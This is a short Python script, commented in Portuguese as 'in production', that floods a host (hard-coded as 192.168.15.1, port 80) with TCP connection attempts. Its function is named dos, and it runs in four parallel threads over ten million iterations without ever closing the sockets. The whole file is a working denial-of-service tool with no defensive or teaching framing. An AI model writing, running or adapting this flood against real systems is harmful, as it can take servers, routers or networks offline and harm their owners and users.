#ESTÁ EM PRODUÇÃO

from concurrent.futures import thread
from msilib import sequence
import os
from threading import Thread
import socket

ip = "192.168.15.1"
porta = 80

def dos():
    for ping in range(1,10000000):
        meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pin = meusocket.connect_ex((ip, porta))

t1 = Thread(target=dos)
t2 = Thread(target=dos)
t3 = Thread(target=dos)
t4 = Thread(target=dos)

t1.start()
t2.start()
t3.start() 
t4.start()
